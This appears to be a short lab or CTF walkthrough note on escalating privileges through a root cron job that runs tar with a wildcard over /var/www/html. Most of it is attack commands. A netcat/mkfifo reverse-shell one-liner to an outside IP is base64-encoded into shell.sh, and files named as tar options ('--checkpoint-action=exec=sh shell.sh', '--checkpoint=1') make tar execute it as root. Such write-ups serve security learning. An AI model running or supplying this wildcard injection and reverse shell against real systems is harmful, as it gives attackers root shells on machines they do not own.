# tar with wildcard

```
alice@readys:/$ cat /etc/crontab
*/3 * * * * root /usr/local/bin/backup.sh

alice@readys:/$ ls -lh /usr/local/bin/backup.sh
-rwxr-xr-x 1 root root 122 Nov 17 12:36 /usr/local/bin/backup.sh

#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

There is a wildcard usage.

[https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

```
alice@readys:/$ cd /var/www/html

# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.147 80 >/tmp/f - Base64 Encoded

alice@readys:/var/www/html$ echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ5LjE0NyA4MCA+L3RtcC9m | base64 -d > shell.sh
alice@readys:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
alice@readys:/var/www/html$ echo "" > --checkpoint=1
```
